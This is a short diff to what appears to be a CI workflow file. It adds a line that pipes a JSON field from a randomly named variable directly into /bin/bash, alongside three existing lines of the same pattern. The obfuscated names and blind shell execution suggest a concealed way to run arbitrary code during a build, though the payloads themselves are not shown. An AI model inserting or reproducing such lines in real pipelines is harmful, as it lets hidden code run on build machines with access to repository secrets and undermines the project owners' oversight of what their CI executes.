@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$b760" | jq -r .qu223 | /bin/bash
           echo $idcim461 | jq -r .nz412 | /bin/bash
           printf '%s' "$ot21973" | jq -r .u43944 | /bin/bash
+          echo $uxh82 | jq -r .f08 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
